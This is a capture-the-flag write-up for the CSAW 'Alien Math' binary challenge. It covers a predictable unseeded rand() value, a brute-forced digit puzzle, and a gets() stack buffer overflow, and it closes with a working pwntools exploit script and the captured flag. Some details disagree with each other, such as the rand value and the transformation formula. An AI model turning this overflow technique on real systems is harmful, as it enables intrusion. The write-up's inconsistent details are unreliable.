# Alien Math

> Brush off your Flirbgarple textbooks!
>
> nc pwn.chal.csaw.io 5004

We are given an executable.
Let's open it in Ghidra.

The challenge is composed of several questions that we must pass.
We also see a `print_flag` function that prints the flag.

In the following we will examine each question one by one.

## First question

The disassembled code given by Ghidra for this question is as follows:

```c

undefined8 main(void)

{
  int iVar1;
  undefined local_38 [36];
  int local_14;
  long local_10;
  
  puts("\n==== Flirbgarple Math Pop Quiz ====");
  puts("=== Make an A to receive a flag! ===\n");
  puts("What is the square root of zopnol?");
  fflush(stdout);
  __isoc99_scanf(&DAT_0040220b,&local_14);
  iVar1 = rand();
  local_10 = (long)iVar1;
  if (local_10 == (long)local_14) {
    puts("Correct!\n");
    fflush(stdout);
    getchar();
    puts("How many tewgrunbs are in a qorbnorbf?");
    fflush(stdout);
    __isoc99_scanf(&DAT_00402247,local_38);
    second_question(local_38);
  }
  else {
    puts("Incorrect. That\'s an F for you!");
  }
  return 0;
}
```

So here we get the line `iVar1 = rand();` and we need to enter the same number.
However, `rand` is pseudorandom, and here `srand` is not initialized so it will actually always return the same value.

By running our version of the program using `gdb` we know it is 0x6b8b456.

## Second question

For the second question, we can input a string of 36 characters. It is then processed with this code:

```c

void second_question(char *param_1)

{
  char cVar1;
  int iVar2;
  size_t n;
  ulong uVar3;
  undefined8 local_38;
  undefined8 local_30;
  undefined8 local_28;
  int i;
  
  i = 0;
  while( true ) {
    uVar3 = SEXT48(i);
    n = strlen(param_1);
    if (n - 1 <= uVar3) {
      local_38 = 0x3436303439353737;
      local_30 = 0x3332333535323538;
      local_28 = 0x353232393232;
      n = strlen((char *)&local_38);
      iVar2 = strncmp((char *)&local_38,param_1,n);
      if (iVar2 == 0) {
        puts("Genius! One question left...\n");
        final_question();
        puts("Not quite. Double check your calculations.\nYou made a B. So close!\n");
      }
      else {
        puts("You get a C. No flag this time.\n");
      }
      return;
    }
    if ((param_1[i] < '0') || ('9' < param_1[i])) break;
    cVar1 = param_1[(long)i + 1];
    iVar2 = second_question_function
                      ((ulong)(uint)(int)param_1[i],(ulong)(uint)(param_1[i] + i),
                       (ulong)(uint)(param_1[i] + i));
    iVar2 = (int)cVar1 + -0x30 + iVar2;
    param_1[(long)i + 1] = (char)iVar2 + (char)(iVar2 / 10) * -10 + '0';
    i = i + 1;
  }
  puts("Xolplsmorp! Invalid input!\n");
  puts("You get a C. No flag this time.\n");
  return;
}
```

Basically, our input should be numbers (see `if ((param_1[i] < '0') || ('9' < param_1[i])) break;`).
Those numbers are transformed, and we pass the question if in the end our transformed input is equal to `local_38` as defined above.

Let's have a closer look at the transformation: if we call `T` the byte string entered, then for `i = 1 to n-1`, the following transformation occurs:
```c
T[i+1] += (T[i+1] + (second_question_function(T[i], T[i]+i)))%10
```

The following Python code brute forces the string character by character to find a valid input.

```python
goal = "7759406485255323229225"

def modify(x, y, i):
    b = ctypes.c_uint((x*0x30 + (x+i)*0xb - 4)).value % 10
    b += y
    return b % 10

print(7, end="")
current = 7
for i in range(21):
    g = int(goal[i+1])
    for next in range(10):
        if modify(current, next, i) == g:
            print(next, end="")
            current = g
            break
```

Correct input: `7856445899213065428791`.

## Final question

```c

void final_question(void)

{
  undefined8 local_18;
  undefined8 local_10;
  
  local_18 = 0;
  local_10 = 0;
  puts(
      "How long does it take for a toblob of energy to be transferred between two quantum entangledsalwzoblrs?"
      );
  fflush(stdout);
  getchar();
  gets((char *)&local_18);
  return;
}
```

This one is a simple buffer overflow where we overflow the buffer to reach the flag function.

Complete exploit script:

```python
from pwn import *

PRINT_FLAG = 0x04014fb

sh = remote("pwn.chal.csaw.io", 5004)
sh.recvuntil("zopnol?")
sh.sendline(str(0x6b8b4567))
sh.recvuntil("qorbnorbf?")
sh.sendline(str(7856445899213065428791))
sh.recvuntil("salwzoblrs?")
sh.sendline(b" "*24 + p32(PRINT_FLAG))
sh.interactive()
```

Flag: `flag{w3fL15n1Rx!_y0u_r34lLy_4R3_@_fL1rBg@rpL3_m4573R!}`